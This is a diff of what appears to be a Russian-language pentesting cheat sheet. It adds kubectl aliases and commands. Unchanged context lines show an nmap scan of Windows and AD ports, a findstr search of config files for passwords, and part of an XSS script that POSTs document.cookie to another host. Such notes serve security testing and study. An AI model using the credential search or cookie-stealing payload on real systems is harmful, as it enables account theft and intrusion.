@@ -56,8 +56,27 @@ nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machi
    ```
    findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
    ```
+## Сокращение (alias) и kubectl
 
-   
+doskey m=minikube $*
+doskey k=kubectl $*
+```
+minikube ssh
+k get nodes
+k cluster-info
+k get pods
+k get pods --namespace=kube-system
+k get pods -o wide
+k get namespaces
+k get svc
+k get deployment
+k run nginx --image=nginx:latest
+k delete pods nginx
+k describe pod nginx
+k create deployment  nginx-deployment --image=nginx
+
+```
+
 ## Веб
 Методология OWASP
 
@@ -87,7 +106,7 @@ nmap -Pn -n -sT -p 88,135,137,389,445,1433,3389 -sV -sC --open -iL list-of-machi
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
-  });
+ });
 </script>\
 ```
 
